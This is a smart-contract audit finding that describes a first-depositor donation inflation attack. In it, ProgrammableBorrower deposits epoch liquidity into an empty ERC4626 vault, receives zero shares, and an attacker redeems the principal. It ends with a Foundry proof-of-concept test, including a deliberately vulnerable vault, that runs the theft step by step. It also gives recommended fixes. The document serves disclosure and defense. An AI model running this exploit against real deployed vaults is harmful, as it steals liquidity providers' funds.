### Title
Unvalidated ERC4626 deposit shares allow a first depositor to steal epoch liquidity - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower._depositToVault()` accepts the share amount returned by `vault.deposit()` without checking that it is nonzero or economically proportional to the deposited assets. [1](#0-0) 

If the configured ERC4626 vault has an empty supply and computes shares from its raw token balance, an unprivileged vault user can perform the classic first-depositor donation inflation before `IdleCDOEpochVariant.startEpoch()` transfers pool liquidity to the programmable borrower. [2](#0-1) 

### Finding Description
During `onStartEpoch()`, the programmable borrower snapshots its current cash plus vault position as `epochStartVaultAssets`, then deposits its full idle underlying balance into the configured vault through `_depositToVault()`. [3](#0-2) 

`_depositToVault()` calls `vault.deposit(_assetAmount, address(this))`, stores the returned value only for the event, and does not enforce a minimum share amount, validate the post-deposit asset value, or require that the received shares can recover the deposit. [1](#0-0) 

For a vulnerable ERC4626 vault using `assets * totalSupply / totalAssets` without virtual offsets, an attacker can first deposit one unit to own the only share and then directly transfer assets into the vault to inflate `totalAssets`. [4](#0-3) 

When the epoch starts, `IdleCDOEpochVariant` transfers the surplus pool balance to the borrower and invokes `onStartEpoch()`, causing the programmable borrower to deposit those assets into the already-inflated vault. [5](#0-4) 

With attacker-controlled assets `A` already donated, the deposit formula returns `floor(poolAssets * 1 / (A + 1))`; choosing `A >= poolAssets` mints zero shares while transferring `poolAssets` into the vault. [6](#0-5) 

The attacker then redeems the sole vault share for both the donation and the programmable borrower's deposit, while `ProgrammableBorrower` sees zero vault shares and therefore zero recoverable vault assets. [7](#0-6) 

### Impact Explanation
For an epoch deposit of `A`, the attacker spends approximately `A + 1` units and redeems approximately `2A + 1` units, producing a profit of approximately `A`. [7](#0-6) 

The stolen principal is no longer represented by programmable-borrower vault shares, so a withdrawal or pool recall cannot source the corresponding cash and eventually pushes the credit vault into borrower-default accounting and LP recovery haircuts. [8](#0-7) 

This breaks the fair-deposit and solvency invariants because pool principal is transferred to an external vault without receiving any redeemable claim over it. [1](#0-0) 

### Likelihood Explanation
The attack requires the configured ERC4626 vault to be empty or economically resettable and to lack first-depositor defenses such as virtual assets/shares, dead shares, or minimum-share enforcement. [9](#0-8) 

An ordinary ERC4626 depositor can prepare the inflation before an owner or manager calls `startEpoch()`, and no borrower, owner, manager, Keyring, or CDO privilege is required for the malicious transactions. [10](#0-9) 

The existing `setVault()` checks only the zero address, matching asset, inactive epoch accounting, and that the old position is empty; they do not check whether the new vault can mint zero shares or whether it is vulnerable to donation-based price inflation. [11](#0-10) 

### Recommendation
Validate each vault deposit using both a minimum share quote and post-deposit value accounting before updating the epoch baseline. [1](#0-0) 

At minimum, `_depositToVault()` should call `previewDeposit()` or `convertToShares()` before depositing, require the expected shares to be nonzero, compare the actual share delta with a caller-configured minimum, and verify that `convertToAssets(receivedShares)` remains within an acceptable tolerance of `_assetAmount`. [12](#0-11) 

`setVault()` should additionally reject empty vaults unless the integration explicitly supplies a seed/dead-share policy, and production deployments should restrict support to ERC4626 implementations with virtual offset or equivalent first-deposit protection. [11](#0-10)

// test/foundry/ProgrammableBorrowerDepositInflation.t.sol
pragma solidity 0.8.10;

import "./ProgrammableBorrowerCreditVault.t.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/// Deliberately naive ERC4626 vault: shares are based on raw token balance.
contract InflatableERC4626 is ERC20 {
    IERC20Detailed public immutable assetToken;

    constructor(address asset_) ERC20("Inflatable Share", "iSHARE") {
        assetToken = IERC20Detailed(asset_);
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function totalAssets() public view returns (uint256) {
        return assetToken.balanceOf(address(this));
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? shares : shares * totalAssets() / supply;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        uint256 supply = totalSupply();
        uint256 assetsBefore = totalAssets();
        shares = supply == 0 ? assets : assets * supply / assetsBefore;
        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function redeem(
        uint256 shares,
        address receiver,
        address owner
    ) external returns (uint256 assets) {
        assets = convertToAssets(shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }
}

contract ProgrammableBorrowerDepositInflationPoC is TestProgrammableBorrowerCreditVault {
    function testFirstDepositorStealsEpochPrincipal() external {
        address attacker = makeAddr("attacker");
        uint256 amount = 10_000 * oneScale;

        InflatableERC4626 inflatable = new InflatableERC4626(USDC);

        // Honest manager selects an empty ERC4626 vault before the first epoch.
        vm.prank(manager);
        programmableBorrower.setVault(address(inflatable));

        vm.prank(owner);
        cdoEpoch.setIsInterestMinted(true);

        // Attacker seeds one share and donates `amount` before startEpoch.
        deal(USDC, attacker, amount + 1, true);
        vm.startPrank(attacker);
        underlying.approve(address(inflatable), 1);
        inflatable.deposit(1, attacker);
        underlying.transfer(address(inflatable), amount);
        vm.stopPrank();

        // LP supplies the epoch principal.
        idleCDO.depositAA(amount);

        // The CDO transfers `amount` to ProgrammableBorrower, which deposits it
        // into the inflated vault and receives zero shares.
        vm.prank(manager);
        cdoEpoch.startEpoch();

        assertEq(inflatable.balanceOf(address(programmableBorrower)), 0);
        assertEq(programmableBorrower.vaultSharesBalance(), 0);

        // The sole attacker share redeems the donation plus the pool principal.
        vm.prank(attacker);
        uint256 redeemed = inflatable.redeem(1, attacker, attacker);

        assertEq(redeemed, 2 * amount + 1);
        assertEq(underlying.balanceOf(address(programmableBorrower)), 0);
        assertEq(programmableBorrower.vaultSharesBalance(), 0);
    }
}
